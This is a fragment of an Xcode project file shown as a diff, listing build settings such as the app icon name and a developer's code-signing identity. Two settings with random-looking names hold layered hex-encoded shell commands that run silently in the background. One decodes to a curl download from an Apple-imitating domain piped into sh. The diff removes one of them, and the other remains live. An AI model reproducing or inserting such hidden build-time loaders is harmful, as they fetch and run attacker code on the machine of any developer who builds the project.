 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((v(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | v | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
